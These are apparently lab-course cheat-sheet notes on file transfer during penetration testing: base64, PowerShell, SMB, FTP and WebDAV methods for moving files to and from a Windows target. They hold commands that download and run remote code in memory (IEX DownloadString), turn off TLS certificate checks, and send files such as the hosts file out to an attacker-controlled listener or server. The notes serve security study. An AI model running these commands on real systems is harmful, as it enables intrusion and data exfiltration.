# Download Operations

## PowerShell Base64 Encode & Decode

From Linux encode the file contents:
```shell-session
cat <file name> | base64 -w 0;echo
```

Decode the contents into a file using PowerShell:
```powershell-session
PS C:\USers> [IO.File]::WriteAllBytes("<location to save>", [Convert]::FromBase64String("<base64 string>"))
```

Check the file transferred successfully:
From Linux:
```shell-session
md5sum <file location>
```
Should match from PowerShell:
```powershell-session
Get-FileHash <file location> -Algorithm md5
```

## PowerShell Web Downloads

Using [Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) for downloading files:
```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>') // Download file

PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>') // Download file without blocking the calling thread

PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('<Target File URL>>') // Load a script into the memory
```

From PowerShell 3.0 onwards [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) is available (although slower):
```powershell-session
Invoke-WebRequest <Target File URL> -OutFile <Output File Name>
```

Bypass Internet Explorer configuration has not been completed:
```powershell-session
PS C:\htb> Invoke-WebRequest <Target File URL> -UseBasicParsing | IEX
```

Bypass no SSL/TLS secure channel:
```powershell-session
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB Downloads

Create SMB server:
```shell-session
[/htb]$ sudo <impacket's smbserver.py file path> <share name> -smb2support <share folder path>
```

Copy a file to the local machine:
```cmd-session
C:\htb> copy \\<ip address>\<share name>\<file name>
```

#### In case of blocked guest access or error copying

Create SMB server with credentials:
```shell-session
[/htb]$ sudo impacket-smbserver <share name> -smb2support <share folder path> -user <username> -password <password>
```

Mount the SMB server:
```cmd-session
C:\htb> net use n: \\<ip address>\<share name> /user:<username> <password>
```

## FTP Downloads

Installing the FTP Server Python3 Module - pyftpdlib:
```shell-session
[/htb]$ sudo pip3 install pyftpdlib
```

Setting up a Python3 FTP Server:
```shell-session
[/htb]$ sudo python3 -m pyftpdlib --port 21
```

Transfering Files from an FTP Server Using PowerShell:
```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://<ip address>/<file name>', '<output file path>')
```

#### In case of no interactive shell

Create a Command File for the FTP Client and Download the Target File:
```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open <ip address>
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

# Upload Operations

## PowerShell Base64 Encode & Decode

Encode the file contents:
```powershell-session
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "<file path>" -Encoding byte))
```

Get the MD5 hash:
```powershell-session
PS C:\htb> Get-FileHash "<file location>" -Algorithm MD5 | select Hash
```

Decode the file contents:
```shell-session
[/htb]$ echo <base64 string> | base64 -d > <output file name>
```

Verify the MD5 hash:
```shell-session
[/htb]$ md5sum <file name>
```

## PowerShell Web Uploads

Install a configured web server and start the server:
```shell-session
[/htb]$ pip3 install uploadserver

[/htb]$ python3 -m uploadserver
```

Upload a file to the file upload server:
```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

PS C:\htb> Invoke-FileUpload -Uri http://<ip address>:8000/upload -File <file path>
```

### PowerShell Base64 Web Upload

Encode file contents and send and send a POST request to Netcat:
```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path '<file path>' -Encoding Byte))

PS C:\htb> Invoke-WebRequest -Uri http://<ip address>:8000/ -Method POST -Body $b64
```

Catch the contents with Netcat and decode the contents:
```shell-session
[/htb]$ nc -lvnp 8000

[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```

## SMB Uploads

### Configuring WebDav Server

Installing WebDav Python modules:
```shell-session
[/htb]$ sudo pip install wsgidav cheroot
```

Using WebDav Python moudle:
```shell-session
[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

Connecting to the WebDav share:
```cmd-session
dir \\<ip address>\DavWWWRoot(or a share folder)
```

Uploading files:
```cmd-session
C:\htb> copy <file path> \\<ip address>\DavWWWRoot\
C:\htb> copy <file path> \\<ip address>\<share folder>\
```

## FTP Uploads

Installing the FTP Server Python3 Module - pyftpdlib:
```shell-session
[/htb]$ sudo pip3 install pyftpdlib
```

Setting up FTP server with uploading allowed:
```shell-session
sudo python3 -m pyftpdlib --port 21 --write
```

Upload a file to the FTP server:
```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://<ip address>/<share folder>', '<file path>')
```

Uploading using a command file:
```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open <ip address>

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT <file path>
ftp> bye
```